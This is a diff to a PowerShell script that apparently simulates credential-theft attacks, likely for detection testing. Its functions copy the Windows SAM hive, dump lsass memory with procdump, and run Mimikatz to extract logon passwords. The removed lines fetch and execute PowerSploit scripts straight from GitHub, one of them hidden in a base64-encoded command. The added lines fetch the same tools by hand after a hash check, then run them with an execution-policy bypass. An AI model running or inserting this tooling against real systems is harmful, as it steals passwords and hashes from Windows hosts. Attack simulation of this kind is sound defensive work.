@@ -81,6 +81,37 @@ Function Write-ErrToConsole([string]$msg) {
     $strDate = Get-Date -Format "hh:mm:ss"
     Write-Host "[!] [$strDate]`t$msg"  -ForegroundColor Red
 }
+Function Write-DownloadMessage([string]$ToolName, [string]$Url,$originalHash){
+    $strDate = Get-Date -Format "hh:mm:ss"
+    Write-Host "[*] [$strDate]`t Please download $toolName from $url and save it to $PSScriptRoot\$FileName"  -ForegroundColor Yellow  
+    Write-Host "[*] [$strDate]`t Please be advised that $toolName is 3rd party tool downloaded from a web server"  -ForegroundColor Yellow
+    Write-Host "[*] [$strDate]`t Press any key when you saved the file"  -ForegroundColor Yellow
+    Read-Host | Out-Null
+
+    $FileName = [io.path]::combine($PSScriptRoot, $ToolName) 
+    if(Test-Path $FileName)
+    {
+        Write-Host "[*] [$strDate]`t Checking SHA1 File "  -ForegroundColor Yellow
+        $SHA1CryptoServiceProvider = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider 
+        $sha1 = ([System.BitConverter]::ToString( $SHA1CryptoServiceProvider.ComputeHash([System.IO.File]::ReadAllBytes($FileName)))).replace("-","")
+        if($sha1 -eq $originalHash)
+        {
+            Write-Host "[*] [$strDate]`t File Hash [$originalHash] Match"  -ForegroundColor Yellow
+            [string]$FileName
+            
+        }
+        else
+        {
+            Write-ErrToConsole "WARNING !!! File hash mismtach [$sha1] - The downloaded file [$FileName] was changed and it's NOT recommended to run it"
+            Exit
+        }
+
+     }
+     else
+     {
+        Write-ErrToConsole  "$FileName not found!"
+     }     
+}
 Function DisplayEULA(){
     
     $Eula = "
@@ -333,22 +364,17 @@ Function Main_Credentials() {
 }
 
 Function sub_Credentials_CopySamFile() {
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam" -verbose
+    $FileName = Write-DownloadMessage -toolName "Invoke-NinjaCopy.ps1" -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1"  -originalHash '474397E9EC73E74747E1962DB55F5D977CBE9A86'
+    . $FileName
+    Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam" -verbose
 }
 Function sub_Credentials_LsassMemoryProcDump() {
 
-    $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
-    $DumpFile = [System.IO.Path]::GetTempFileName().replace(".tmp", ".dmp")
-    $url = "https://live.sysinternals.com/procdump.exe"
-    
-    Write-LogToConsole "Downloading procdump into [$FileName]"
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($url, $FileName)
-    
+    $FileName = Write-DownloadMessage -toolName 'procdump.exe' -url 'https://live.sysinternals.com/procdump.exe'  -originalHash 'D1387F3C94464D81F1A64207315B13BF578FD10C'
     Unblock-File $FileName
     Start-ProcessEx -FileName $FileName -Arguments "-accepteula -accepteula -64 -ma lsass.exe $DumpFile"
 
-    Write-LogToConsole "Deleting procdump [$FileName]"
+    Write-LogToConsole "Deleting procdump $FileName"
     Remove-Item $FileName -Force
 
 }
@@ -384,39 +410,38 @@ Function sub_Credentials_LsassMemoryDump() {
     }
 }
 Function sub_Credentials_Mimikatz() {
-    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m
+    $FileName = Write-DownloadMessage -toolName "Invoke-Mimikatz.ps1" -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"  -originalHash '895B2265B06C63E523D08AA994F33167DE46029D'
+    . $FileName
+    Invoke-Mimikatz -DumpCreds -verbose    
 }
 Function sub_Credentials_EncodedMimikatz() {
-    Start-ProcessEx -FileName "PowerShell.exe" -Arguments "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA=="
+    $FileName = Write-DownloadMessage -toolName "Invoke-Mimikatz.ps1" -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"  -originalHash '895B2265B06C63E523D08AA994F33167DE46029D'
+    $Command = "& {. '$FileName'; Invoke-Mimikatz -DumpCreds -verbose}"
+    $EncCommand =[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
+    Start-ProcessEx -FileName "PowerShell.exe" -Arguments "-executionpolicy bypass  -enc $EncCommand"
 }
 Function sub_Credentials_MimikatzLogonpasswords() {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".zip")
-    $Folder = [System.IO.Path]::GetDirectoryName($FileName)
-    $url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180325/mimikatz_trunk.zip"
     
-    Write-LogToConsole "Downloading mimikatz into [$FileName]"
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($url, $FileName)
-    
+    $FileName = Write-DownloadMessage -toolName 'mimikatz_trunk.zip' -url "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180325/mimikatz_trunk.zip"  -originalHash '37AE18628B949D6A4C44F6DD684204CB1377BD32'
     Unblock-File $FileName
-    [System.IO.Compression.ZipFile]::ExtractToDirectory($FileName, $Folder)
+    
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($FileName, $PSScriptRoot)
     if([Environment]::Is64BitOperatingSystem)  {
         Write-LogToConsole "Windows is 64Bit"
-        Start-ProcessEx -FileName "$Folder\x64\mimikatz.exe" -Arguments """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""
+        Start-ProcessEx -FileName "$PSScriptRoot\x64\mimikatz.exe" -Arguments """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""
     }
     else {
         Write-LogToConsole "Windows is 32Bit"
-        Start-ProcessEx -FileName "$Folder\Win32\mimikatz.exe" -Arguments """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""
+        Start-ProcessEx -FileName "$PSScriptRoot\Win32\mimikatz.exe" -Arguments """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""
     }
 
     Write-LogToConsole "Clean-up and remove files"
     sleep -Milliseconds 500
-    Remove-Item "$Folder\x64\" -Force -Recurse
-    Remove-Item "$Folder\Win32\" -Force -Recurse
-    Remove-Item "$Folder\mimicom.idl" -Force 
-    Remove-Item "$Folder\kiwi_passwords.yar" -Force
-    Remove-Item "$Folder\README.md" -Force
+    Remove-Item "$PSScriptRoot\x64\" -Force -Recurse
+    Remove-Item "$PSScriptRoot\Win32\" -Force -Recurse
+    Remove-Item "$PSScriptRoot\mimicom.idl" -Force 
+    Remove-Item "$PSScriptRoot\kiwi_passwords.yar" -Force
+    Remove-Item "$PSScriptRoot\README.md" -Force
 
 
 }
